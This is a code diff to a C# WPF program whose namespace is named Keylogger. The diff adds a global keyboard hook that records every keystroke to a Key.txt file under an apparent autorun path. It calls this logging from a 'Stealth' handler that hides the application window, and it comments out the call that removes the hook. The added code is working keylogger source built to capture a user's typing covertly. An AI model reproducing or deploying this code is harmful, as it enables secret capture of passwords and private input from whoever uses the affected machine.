@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Windows;
 using System.Windows.Controls;
 using System.Runtime.InteropServices;
@@ -41,7 +42,35 @@ namespace Keylogger
             
 
         }
-        
+
+        #region TESTST
+
+        globalKeyboardHook gkh = new globalKeyboardHook();
+        private void HookAll()
+        {
+            foreach (object key in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
+            {
+                gkh.HookedKeys.Add((System.Windows.Forms.Keys)key);
+            }
+        }
+        private void Form1_Load()
+        {
+            gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
+            HookAll();
+            if (File.Exists(AutoRun.Path() + "Key.txt"))
+            {
+                //File.Delete(AutoRun.Path() + "Key.txt");
+            }
+        }
+        void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
+        {
+            StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
+            SW.Write(e.KeyCode);
+            SW.Close();
+        }
+
+        #endregion
+
         #region HotKey
         private const int HOTKEY_ID = 9000;
         private IntPtr _windowHandle;
@@ -194,13 +223,14 @@ namespace Keylogger
      private void Stealth_Checked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
-            keylog.SetHook();
+            //keylog.SetHook();
+            Form1_Load();
         }
 
      private void Stealth_Unchecked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Visible;
-            keylog.Unhook();
+            //keylog.Unhook();
         }
 
         private void tblock_TextChanged(object sender, TextChangedEventArgs e)
